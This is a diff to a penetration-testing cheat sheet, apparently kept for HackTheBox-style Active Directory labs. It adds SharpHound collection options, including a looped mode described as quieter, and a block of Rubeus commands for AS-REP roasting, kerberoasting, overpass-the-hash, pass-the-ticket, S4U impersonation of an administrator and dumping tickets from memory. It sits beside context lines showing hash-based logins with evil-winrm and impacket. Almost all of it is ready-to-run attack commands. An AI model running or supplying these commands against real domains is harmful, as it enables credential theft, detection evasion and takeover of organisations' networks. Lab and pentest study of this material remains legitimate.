@@ -17,7 +17,9 @@ nxc smb $IP -u user -p pass --rid-brute            # enumerate all users
 nxc ldap $IP -u user -p pass --bloodhound -c all --dns-server $IP
 # BloodHound collection
 bloodhound-python -u user -p pass -d target.htb -ns $IP -c all --zip
-# or on Windows target: .\SharpHound.exe -c All
+# web01 (domain-joined) — SharpHound zips by default; copy the .zip back to kali:
+.\SharpHound.exe -c All --zipfilename loot           # -> <timestamp>_loot.zip
+.\SharpHound.exe -c All --loop --loopduration 00:10:00   # spread collection out (quieter)
 # LDAP dumps
 ldapdomaindump -u 'target\user' -p pass $IP
 # PowerView (on a Windows shell)
@@ -144,6 +146,19 @@ evil-winrm -i $IP -u user -H NThash                 # if WinRM open
 impacket-getTGT target.htb/user -hashes :NThash ; export KRB5CCNAME=user.ccache
 impacket-psexec -k -no-pass target.htb/user@dc01.target.htb
 ```
+
+### Rubeus (from a Windows shell — roasting, tickets, PtT)
+```powershell
+# web01 (domain-joined shell)
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+.\Rubeus.exe kerberoast /outfile:kerb.txt              # add /tgtdeleg to roast with the current TGT
+.\Rubeus.exe asktgt /user:svc /rc4:<NThash> /ptt       # overpass-the-hash -> inject a TGT
+.\Rubeus.exe asktgt /user:svc /aes256:<key> /ptt       # AES variant if RC4 is disabled
+.\Rubeus.exe ptt /ticket:<base64|kirbi>                # pass-the-ticket (inject a stolen ticket)
+.\Rubeus.exe s4u /user:svc$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt
+.\Rubeus.exe triage                                    # list tickets in memory  (dump /nowrap to extract)
+```
+Crack the roast output on kali with the hashcat modes in the password file (13100 / 18200).
 
 ### To Domain Admin / DC
 ```bash
